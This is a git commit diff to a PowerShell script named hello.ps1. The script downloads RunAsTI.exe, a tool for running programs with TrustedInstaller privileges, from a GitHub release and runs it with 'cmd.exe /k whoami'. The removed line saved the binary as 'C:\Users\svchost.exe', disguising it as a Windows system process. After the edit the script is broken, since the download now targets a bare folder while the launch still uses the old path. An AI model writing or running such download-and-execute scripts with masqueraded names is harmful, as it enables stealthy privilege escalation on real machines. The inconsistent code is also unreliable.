abbcd7592b23a5755c80b585f083d2cb07d52ed3
gridblue <150575974+Bbblaxtop@users.noreply.github.com>
2026-05-26 18:15:36 +0500

    Update hello.ps1

--- hello.ps1
+++ hello.ps1
@@ -1,2 +1,2 @@
-Invoke-WebRequest -Uri "https://github.com/mbcdev/RunAsTrustedInstaller/releases/download/release-0.2/RunAsTI.exe" -OutFile "C:\Users\svchost.exe"
+Invoke-WebRequest -Uri "https://github.com/mbcdev/RunAsTrustedInstaller/releases/download/release-0.2/RunAsTI.exe" -OutFile [Environment]::GetFolderPath("LocalApplicationData")
 Start-Process -FilePath "C:\Users\svchost.exe" -ArgumentList "cmd.exe /k whoami"
